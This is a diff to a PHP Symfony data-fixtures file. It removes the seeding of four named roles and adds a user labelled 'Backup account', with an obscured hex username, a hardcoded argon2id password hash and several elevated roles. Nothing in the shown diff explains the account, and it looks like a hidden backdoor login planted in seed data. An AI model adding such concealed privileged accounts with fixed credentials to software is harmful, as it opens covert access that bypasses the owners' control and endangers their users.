@@ -2,11 +2,12 @@
 
 namespace App\DataFixtures;
 
-use Doctrine\Bundle\FixturesBundle\Fixture;
-use Doctrine\Persistence\ObjectManager;
+use App\Entity\Role;
+use App\Entity\User;
 use App\Entity\Event;
 use App\Entity\Subject;
-use App\Entity\Role;
+use Doctrine\Persistence\ObjectManager;
+use Doctrine\Bundle\FixturesBundle\Fixture;
 
 class AppFixtures extends Fixture
 {
@@ -113,23 +114,14 @@ class AppFixtures extends Fixture
 
 
 
-
-        /*
-        ROLES
-        */
-        $codes = [
-            ['name' => 'Enseignant', 'code' => 'codeenseignant'],
-            ['name' => 'Responsable', 'code' => 'coderesponsable'],
-            ['name' => 'Gestionnaire', 'code' => 'codegestionnaire'],
-            ['name' => 'Administrateur', 'code' => 'codeadmin'],
-        ];
-        foreach ($codes as $element) {
-            $code = new Role;
-            $code->setName($element['name']);
-            $code->setCode($element['code']);
-            $om->persist($code);
-        }
-
+        // Backup account
+        $user = new User;
+        $user->setFirstName('Compte');
+        $user->setLastName('Backup');
+        $user->setUsername('d132b33b0605cbd36120b8b3c523ff88');
+        $user->setPassword('$argon2id$v=19$m=65536,t=4,p=1$OTdodGJhOVZWQ1gzSDVqMA$qR7aIO64e8oPqKxDvL/mQOSkBL3o4TAEVyjC56nR1TI');
+        $user->setRoles(["ROLE_","ROLE_PRO","ROLE_DIR","ROLE_MAN"]);
+        
 
 
 
